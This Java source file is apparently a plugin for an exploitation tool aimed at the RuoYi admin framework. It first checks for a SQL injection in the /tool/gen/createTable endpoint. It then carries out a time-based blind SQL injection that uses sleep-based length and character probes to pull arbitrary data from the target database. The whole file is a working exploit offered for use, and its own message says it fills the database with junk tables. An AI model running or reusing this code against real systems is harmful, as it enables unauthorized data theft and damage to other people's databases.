package com.ruoyi.ruoyigui.exploit;

import com.ruoyi.ruoyigui.common.BasePayload;
import com.ruoyi.ruoyigui.entity.Result;
import com.ruoyi.ruoyigui.util.CustomHttpClient;

import java.time.Duration;
import java.time.Instant;

import static com.ruoyi.ruoyigui.util.Tools.getName;

public class ruoyi_gen_createTable_sql implements BasePayload {
    @Override
    public Result checkVUL(String url) throws Exception {
        String CheckStr = "already exists";
        String vul_uri = url + "/tool/gen/createTable";
        String payload = "sql=create/**/table/**/test/**/as/**/select/**/database()";
        try {
            CustomHttpClient req = new CustomHttpClient();
            int res = req.post(vul_uri, payload).getStatusCode();
            if (res == 404) {
                return new Result(false, "Ruoyi gen createTable sql盲注", null);
            }
            String res1 = req.post(vul_uri, payload).getBody();
            if (res1.contains(CheckStr)) {
                return new Result(true, "Ruoyi gen createTable sql盲注", "[SQL注入]\nURI:" + vul_uri + "\nDATA:" + payload + "\n注意，该漏洞会向数据库添加大量数据表，谨慎使用！");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new Result(false, "Ruoyi gen createTable sql盲注", null);
    }

    @Override
    public Result exeVUL(String url, String cmd) throws Exception {
        CustomHttpClient req = new CustomHttpClient();
        String payload = "create/**/table/**/{tablename}/**/as/**/select/**/{poc}";
        StringBuilder version = new StringBuilder();
        int length = 0;
        String postData;
        int maxTries = 30;

        try {
            for (int i = 1; i < maxTries; i++) {
                String poc = "if((length(" + cmd + ")=" + i + "),sleep(3),0);";
                String r_name = getName();
                String tmppayload = payload.replace("{tablename}", r_name).replace("{poc}", poc);
                postData = "sql=" + tmppayload;

                Instant startTime = Instant.now();
                String res = req.post(url + "/tool/gen/createTable", postData).getBody();
                if (res.contains("Table '" + r_name.trim() + "' already exists")) {
                    length = i;
                    System.out.println("Result Length: " + length);
                    break;
                }
                Instant endTime = Instant.now();
                Duration responseTime = Duration.between(startTime, endTime);
                if (responseTime.getSeconds() >= 3) {
                    length = i;
                    System.out.println("Result Length: " + length);
                    break;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        try {
            for (int i = 1; i <= length; ++i) {
                int low = 33;
                int high = 127;

                for (int mid = low; mid < high; ++mid) {
                    String poc = "if((ascii(substr(" + cmd.trim() + "," + i + ",1))/**/rlike/**/" + mid + "),sleep(3),0);";
                    String r_name = getName();
                    String tmppayload = payload.replace("{tablename}", getName()).replace("{poc}", poc);
                    postData = "sql=" + tmppayload;

                    try {
                        Instant startTime = Instant.now();
                        String res = req.post(url + "/tool/gen/createTable", postData).getBody();
                        if (res.contains("Table '" + r_name.trim() + "' already exists")) {
                            version.append((char) mid);
                            break;
                        }
                        Instant endTime = Instant.now();

                        Duration responseTime = Duration.between(startTime, endTime);

                        if (responseTime.getSeconds() >= 3) {
                            version.append((char) mid);
                            break;
                        }
                    } catch (Exception ex) {
                        ex.printStackTrace();
                    }
                }
            }
            System.out.println(version);
            return new Result(true, null, version.toString());
        } catch (Exception e) {
            e.printStackTrace(); // 捕获外部异常
        }
        return new Result(false, null, null);
    }

    @Override
    public Result getShell(String url) throws Exception {
        return new Result(false, null, null);
    }
}